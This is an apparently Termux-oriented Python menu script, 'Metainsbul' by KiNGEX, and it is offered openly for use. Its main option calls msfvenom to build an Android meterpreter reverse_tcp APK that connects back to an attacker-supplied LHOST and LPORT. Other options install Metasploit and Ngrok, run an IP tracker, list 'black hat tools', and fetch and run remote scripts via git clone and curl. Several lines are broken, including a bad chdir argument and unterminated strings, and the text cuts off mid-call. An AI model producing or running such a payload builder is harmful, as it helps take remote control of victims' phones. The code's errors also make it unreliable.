import os
    
def build_payload():
    os.system('clear')
    lhost = input("LHOST - ")
    os.system('clear')
    lport = input("LPORT - ")
    os.system('clear')
    apk_name = input("Payload Name - ")
    os.system('clear')
    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
    print("IN FOLDERS SECTION")

    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"

    print(msfvenom_command)

    os.system(msfvenom_command)

    os.system(f"mv {apk_name}.apk /storage/emulated/0/")

def update():
    os.system("rm -rf Metainsbul")
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("cd Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

def install_metasploit():
    os.system("python requirements.py")

def launch_metasploit():
    os.system('pkg install curl')
    os.system('pkg install ruby -y')
    os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \')
    os.system('chmod 755 msfinstall && \')
    os.system('./msfinstall')

  
while True:
    os.system("clear")
    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
    print(" By KiNGEX | https://GitHub.com/KiNGEX1 | Version - 2.1") 
    print("________________________________________")


    print("\033[93mOptions:\033[0m")
    print(" ")         
    print("\033[93m1. Build Payload (Android Only)\033[0m")
    print(" ")          
    print("\033[93m2. Install Metasploit (from modified scprit)\033[0m")
    print(" ")          
    print("\033[93m3. Install Metasploit (from official)\033[0m")
    print(" ")          
    print("\033[93m4. Update Metainsbul\033[0m") 
    print(" ")          
    print("\033[93m5. Ngrok Install & Start\033[0m")
    print(" ")          
    print("\033[93m6. IP Tracker\033[0m")
    print(" ")         
    print("\033[93m7. Fix Errors\033[0m")
    print(" ")          
    print("\033[93m8. Install ubuntu to run as root\033[0m")
    print(" ")          
    print("\033[93m9. Install Metasploit in ubuntu\033[0m")
    print(" ")         
    print("\033[93m10. Launch Metasploit in unbuntu (You can run msfvemon commands) \033[0m")
    print(" ")         
    print("\033[93m11. Launch Metasploit\033[0m")
    print(" ")          
    print("\033[93m12. Black hat tools\033[0m")
    print(" ")          
    print("\033[93m13. install Apktool\033[0m")
    print(" ")         
    print("\033[93m14. exit tool \033[0m")

    choice = input("\033[91mKiNGEX: \033[0m").strip()

    if choice == '1':
        build_payload() 
    elif choice == '2':
        install_metasploit()
    elif choice == '3':
        launch_metasploit()
    elif choice == '4':
        update()
    elif choice == '6':
        os.system("clear")
        os.system("python iptrack.py")   
    elif choice == '5':
        os.system("python Ngrokinstall.py")
    elif choice == '7':
        os.system("python ErrorFix.py")
    elif choice == '8':
        os.system('python ubuntu.py')
    elif choice == '9':
        os.system('python umeta.py
